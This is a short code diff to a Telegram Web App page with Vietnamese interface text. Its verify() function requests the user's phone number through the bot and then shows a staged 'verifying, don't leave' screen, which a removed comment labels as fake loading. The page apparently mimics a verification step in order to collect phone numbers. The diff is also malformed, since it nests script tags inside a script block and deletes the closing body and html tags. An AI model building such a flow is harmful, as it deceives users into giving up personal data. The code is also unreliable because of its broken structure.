@@ -35,17 +35,17 @@ if (params.get("verified") === "1") {
     document.body.innerHTML = "✅ Xác minh thành công!";
 }
 
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<script>
+Telegram.WebApp.ready();
+
 function verify() {
-    // gửi yêu cầu về bot
     Telegram.WebApp.sendData("request_phone");
 
-    // loading fake
     document.body.innerHTML = `
         <h3>Đợi đã, đừng đi ra ngoài</h3>
         <p>⏳ Đang xác minh...</p>
     `;
 }
 </script>
-
-</body>
-</html>
